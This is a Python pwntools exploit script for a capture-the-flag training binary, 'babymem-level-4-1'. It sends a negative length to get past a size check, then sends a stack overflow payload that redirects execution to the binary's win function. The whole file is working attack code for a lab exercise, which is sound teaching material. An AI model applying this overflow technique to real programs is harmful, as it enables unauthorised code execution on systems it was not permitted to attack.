#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babymem-level-4-1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './babymem-level-4-1')
context.terminal = ['wt.exe', '-w', '0', 'nt', 'wsl.exe', '--']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, api=True, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# tbreak main
break *challenge+373
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()
# io.gdb.Breakpoint("*challenge+373")
offset = cyclic_find(0x6161616161616172)
offset =136
pay = flat({
    offset: p64(exe.sym.win)
})
io.sendline(str(-len(pay)))
io.sendline(pay)

io.interactive()

